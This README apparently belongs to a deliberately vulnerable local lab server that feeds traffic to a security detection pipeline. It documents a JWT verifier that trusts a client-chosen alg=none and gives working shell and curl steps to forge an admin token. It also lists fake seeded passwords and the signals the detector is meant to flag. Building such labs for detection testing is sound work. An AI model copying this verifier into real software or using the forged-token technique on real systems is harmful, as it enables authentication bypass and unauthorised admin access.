# admin-jwt-none

⚠️ **Intentionally vulnerable — local lab only.** This server exists to give
mega-analyzer's `pkg/ncer` causal reconciliation pipeline and the Rust
`omnisec-mitm` interceptor real, reproducible traffic to detect. It binds to
`127.0.0.1` only, uses fake/placeholder credentials and secrets throughout,
and must never be exposed to a network or used as a template for real code.

## Vulnerability

**CWE-347: Improper Verification of Cryptographic Signature**

This server implements its own tiny JWT-like token format (see `jwt.go`,
~150 lines, no external JWT library — the bug is meant to be readable
directly in this repo). The token verifier, `parseAndVerify`, reads the
`alg` field out of the **client-supplied token header itself** and branches
on it:

- `"alg":"HS256"` → the signature is checked with HMAC-SHA256 against a
  hardcoded server secret (`jwtSecret = "lab-insecure-secret-change-me"` in
  `jwt.go`, a documented fake placeholder).
- `"alg":"none"` → **no signature check happens at all.** The payload
  claims (including `role`) are decoded and trusted as-is.

The vulnerable branch is marked in `jwt.go` with:

```go
// INTENTIONALLY INSECURE: trusts client-controlled alg
```

Because the algorithm is chosen by whoever crafted the token instead of
being pinned server-side, anyone can build a token that says "trust me, I
used no algorithm" and skip authentication entirely.

## Endpoints

- `POST /login` — real username/password check against Postgres, issues a
  legitimately-signed `HS256` token containing `sub` and `role`.
- `GET /api/me` — parses `Authorization: Bearer <token>` via
  `parseAndVerify` and returns the resulting claims.
- `GET /api/admin/dashboard` — requires `role == "admin"` from the verified
  claims. This is the endpoint the exploit targets.

When a token with `alg=none` is accepted, the server logs loudly to stdout:

```
[JWT-NONE BACKDOOR USED] remote=127.0.0.1:54321 sub="attacker" role="admin" path=/api/admin/dashboard
```

and, if `TRACKER_URL` is set, fires a best-effort, non-blocking async POST
(2s timeout, errors ignored) describing the event, in the same beacon
pattern used by other lab servers in this repo (sink: `labs/servers/trackercollector`).

## Running it

```
LISTEN_ADDR=127.0.0.1:18002 \
DATABASE_URL=postgres://labs:labs_lab_pw@127.0.0.1:55432/labs_admin_jwt_none?sslmode=disable \
TRACKER_URL=http://127.0.0.1:18099/ \
go run .
```

The Postgres schema/seed data lives at
`labs/servers/db/postgres/init/02-admin-jwt-none.sql` and is applied
automatically by the shared lab Postgres container's `docker-entrypoint-initdb.d`
mechanism. It seeds three users with documented fake plaintext passwords:

| username     | password             | role      |
|--------------|-----------------------|-----------|
| `alice_user` | `alice-plaintext-pw`  | user      |
| `mod_mike`   | `mike-plaintext-pw`   | moderator |
| `root_admin` | `admin-plaintext-pw`  | admin     |

## Exploit: forging an `alg=none` admin token

No credentials, no `/login` call, no interaction with the real admin
account at all — just three base64url segments joined by dots.

**1. Build the header and payload JSON, then base64url-encode each
(unpadded, `-`/`_` alphabet):**

Header: `{"alg":"none","typ":"JWT"}`
Payload: `{"sub":"attacker","role":"admin","exp":9999999999}`

Using a shell one-liner:

```sh
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=\n')
PAYLOAD=$(printf '{"sub":"attacker","role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=\n')
TOKEN="${HEADER}.${PAYLOAD}."   # trailing dot: empty signature segment
echo "$TOKEN"
```

This produces a token that looks like:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.
```

**2. Use it against the protected endpoint:**

```sh
curl -s -H "Authorization: Bearer ${TOKEN}" \
  http://127.0.0.1:18002/api/admin/dashboard
```

Expected (vulnerable) result — HTTP 200 with admin data, no login ever
performed:

```json
{"dashboard":"top secret admin data","sub":"attacker"}
```

Compare against a legitimate non-admin login (`alice_user` /
`alice-plaintext-pw` via `POST /login`), whose token correctly gets `403
forbidden: admin role required` from the same endpoint — the `alg=none`
token is what breaks the check.

## What the ncer/mitm pipeline should flag

- The `Authorization: Bearer <token>` header on the request to
  `/api/admin/dashboard` whose decoded header segment is `{"alg":"none",...}`
  — a client asserting "no signature" on a bearer token is itself a strong
  signal.
- The empty third (signature) segment in the token.
- The response: HTTP `200` with admin-scoped data returned to a request
  that never went through `/login` and carries no valid HS256 signature —
  i.e., a causal mismatch between "no authentication event occurred" and
  "an authenticated admin action succeeded."
- The `[JWT-NONE BACKDOOR USED]` log line / `TRACKER_URL` beacon emitted by
  the server itself, which this lab intentionally surfaces so the collector
  has a corroborating signal to reconcile against the captured traffic.
